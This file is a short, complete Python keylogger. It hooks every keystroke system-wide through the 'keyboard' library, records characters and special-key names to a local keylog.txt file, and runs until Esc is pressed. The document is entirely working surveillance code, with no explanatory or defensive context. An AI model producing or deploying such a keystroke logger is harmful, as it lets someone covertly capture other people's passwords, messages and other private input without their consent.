import keyboard

# The log file where keystrokes will be saved
log_file = "keylog.txt"

def on_key_event(event):
    with open(log_file, "a") as f:
        if event.event_type == "down":
            if event.name == "space":
                f.write(" ")
            elif event.name == "enter":
                f.write("\n")
            elif event.name == "tab":
                f.write("\t")
            elif len(event.name) > 1:  # Special keys (ctrl, shift, etc.)
                f.write(f" [{event.name}] ")
            else:
                f.write(event.name)

# Set up the listener
keyboard.hook(on_key_event)

# Block the program so it keeps running and listening for events
keyboard.wait("esc")
